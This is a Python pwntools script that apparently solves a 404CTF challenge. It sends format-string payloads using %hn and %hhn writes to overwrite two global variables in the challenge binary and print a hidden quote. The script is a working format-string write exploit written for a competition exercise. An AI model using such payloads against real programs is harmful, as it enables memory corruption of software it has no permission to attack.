#!/usr/bin/env python3

from pwn import *
from time import sleep


HOST = "challenges.404ctf.fr"
PORT = 31719

exe = ELF("./une_citation_pas_comme_les_autres_1_2")

context.binary = exe.path

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    elif args.TRACE:
        r  = process(["strace", "-o","strace.out", exe.path])
    else:
        r = process([exe.path])
    return r

def get_cit(num):
    global r
    r = conn()

    rep = r.recv()

    chosen_index_addr = 0x004be130
    num_quote_addr = 0x004be134

    r.send(b'2\n')
    rep = r.recv()
    r.send(p64(chosen_index_addr)*10 + b'\n')
    rep = r.recv()

    payload = f'%{num}x%14$hn'


    r.send(b'2\n')
    rep = r.recv()
    r.send(payload.encode() + b'\n')
    rep = r.recvuntil(b'>>> ')

    r.send(b'2\n')
    rep = r.recv()
    r.send(p64(chosen_index_addr + 2)*10 + b'\n')
    rep = r.recv()
    r.send(b'2\n')
    rep = r.recv()
    r.send(b'A%14$hhn' + b'\n')
    rep = r.recvuntil(b'>>> ')

    r.send(b'2\n')
    rep = r.recv()
    r.send(p64(num_quote_addr)*10 + b'\n')
    rep = r.recv()
    r.send(b'2\n')
    rep = r.recv()
    r.send(b'AAAAAAAA' + b'%65527x%14$hn' + b'\n')
    rep = r.recvuntil(b'>>> ')

    r.send(b'2\n')
    rep = r.recv()
    r.send(p64(num_quote_addr + 2)*10 + b'\n')
    rep = r.recv()
    r.send(b'2\n')
    rep = r.recv()
    r.send(b'AAAAAAAA' + b'%65527x%14$hn' + b'\n')
    rep = r.recvuntil(b'>>> ')


    r.send(b'1\n')

    rep = r.recv().split(b'1: ')[0].decode()
    print(len(rep))
    r.close()

    return rep




def main():

    print(get_cit(0x39c4))


if __name__ == "__main__":
	main()
